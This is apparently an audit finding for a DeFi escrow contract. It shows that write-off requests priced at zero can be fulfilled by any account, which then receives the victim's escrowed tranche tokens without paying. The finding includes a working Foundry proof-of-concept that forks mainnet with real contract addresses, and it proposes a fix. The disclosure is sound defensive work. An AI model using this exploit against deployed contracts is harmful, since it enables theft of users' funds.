### Title
Zero-priced write-off requests let any fulfiller steal escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` rejects a zero tranche amount but accepts `underlyingsRequested == 0`. `fullfillWriteOffRequest` then treats any nonnegative payment as sufficient because its only payment check is `_underlyings < currentRequest.underlyings`. Any unprivileged account can therefore call `fullfillWriteOffRequest(victim, requestedTranches, 0)`, transfer zero underlying, and receive all tranche tokens escrowed by the victim.

### Finding Description
A write-off request consists of escrowed tranche tokens and the lender’s minimum requested underlying payment. Creation only validates `amount != 0`; it does not validate that `underlyingsRequested` is nonzero. [1](#0-0) 

Fulfillment is intentionally callable by any wallet. It requires an exact tranche amount and an underlying payment that is at least the recorded request amount, but when the request is zero, `_underlyings = 0` passes validation. [2](#0-1) 

The function then deletes the request before transferring `safeTransferFrom(attacker, escrow, 0)`, paying the user `_underlyings - fee`, and transferring the full `_tranches` amount to the attacker. With `_underlyings == 0`, the user receives nothing and the attacker receives the complete escrowed position. [3](#0-2) 

The vault enforces tranche and epoch checks only when the borrower subsequently calls `writeOffDeposit`; it does not constrain the separate escrow fulfillment path. [4](#0-3) 

### Impact Explanation
An attacker can permanently steal every tranche token escrowed in a zero-priced request without paying underlying or requiring an allowance for a nonzero amount. For example, a request escrowing `10,000e18` tranche tokens can be fulfilled with zero USDC, causing the lender to lose the full claim represented by those tokens. A KYC-passing attacker can subsequently use the stolen tranches in the vault withdrawal flow.

### Likelihood Explanation
The exploit only requires a lender to create a malformed zero-price request during a running epoch. Fulfillment is permissionless and atomic, so any observer or keeper can claim the escrowed tokens before the lender deletes the request. Existing checks do not prevent this: `amount` is nonzero, the epoch is running, the tranche amount matches exactly, and zero is not less than the recorded zero underlying amount.

### Recommendation
Reject `underlyingsRequested == 0` in `createWriteOffRequest`, unless zero-price giveaways are an explicitly intended feature. If such transfers must be supported, require a separate deliberate mechanism rather than allowing the same order type to be permissionlessly claimed for no consideration.

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow} from
  "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from
  "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract ZeroPriceWriteOffPoC is Test {
  IdleCDOEpochVariant constant CDO =
    IdleCDOEpochVariant(0xf6223C567F21E33e859ED7A045773526E9E3c2D5);
  address constant LP = 0xA7780086ab732C110E9E71950B9Fb3cb2ea50D89;
  address constant TREASURY = 0xFb3bD022D5DAcF95eE28a6B07825D4Ff9C5b3814;

  IdleCreditVaultWriteOffEscrow escrow;
  IERC20Detailed underlying;
  IERC20Detailed tranche;
  address attacker = makeAddr("attacker");

  function setUp() public {
    vm.createSelectFork("mainnet", 23032567);

    escrow = new IdleCreditVaultWriteOffEscrow();
    vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
    escrow.initialize(address(CDO), TREASURY, true);

    underlying = IERC20Detailed(CDO.token());
    tranche = IERC20Detailed(CDO.AATranche());
  }

  function test_zeroPriceRequestIsStolenForFree() public {
    uint256 trancheAmount = 10_000e18;
    deal(address(tranche), LP, trancheAmount);

    uint256 lpUnderlyingBefore = underlying.balanceOf(LP);
    uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);

    vm.startPrank(LP);
    tranche.approve(address(escrow), trancheAmount);
    // Missing validation records a valid request with zero consideration.
    escrow.createWriteOffRequest(trancheAmount, 0);
    vm.stopPrank();

    // Any account can fulfil it. No underlying approval or balance is needed.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, trancheAmount, 0);

    (uint256 remainingTranches, uint256 remainingUnderlying) =
      escrow.userRequests(LP);

    assertEq(remainingTranches, 0);
    assertEq(remainingUnderlying, 0);
    assertEq(tranche.balanceOf(attacker), trancheAmount);
    assertEq(underlying.balanceOf(LP), lpUnderlyingBefore);
    assertEq(underlying.balanceOf(attacker), attackerUnderlyingBefore);
  }
}

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();

  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }
